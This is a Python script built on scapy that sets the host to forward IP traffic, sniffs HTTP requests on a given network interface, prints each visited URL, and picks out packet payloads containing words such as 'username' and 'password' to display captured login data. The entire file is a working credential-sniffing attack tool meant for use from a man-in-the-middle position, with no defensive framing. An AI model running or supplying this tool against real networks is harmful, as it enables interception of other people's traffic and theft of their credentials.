#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
import argparse
import subprocess

subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest='interface',
                        help='Interface ex.(eht0, wlan0)')
    # parser.add_argument('-g', '--gateway', dest='gateway_ip',
    #                     help='Gateway IP Address that will be spoofed ex.(10.0.2.1)')
    options = parser.parse_args()
    if not options.interface:
        # code to handle error
        parser.error(
            '[-] Please specify an Interface, use --help for more information.')
    # elif not options.gateway_ip:
    #     # code to handle error
    #     parser.error(
    #         '[-] Please specify a Gateway address to spoof, use --help for more information.')
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url_data(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_data(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        load = str(load)
        keywords = ['username', 'user', 'login', 'password', 'pass']
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url_data(packet)
        print('[+] HTTP Request >> ' + url)

        login_data = get_login_data(packet)
        if login_data:
            print(
                '\n\n[+] Possible username/password >> ' + login_data + '\n\n')


options = get_arguments()
sniff(options.interface)
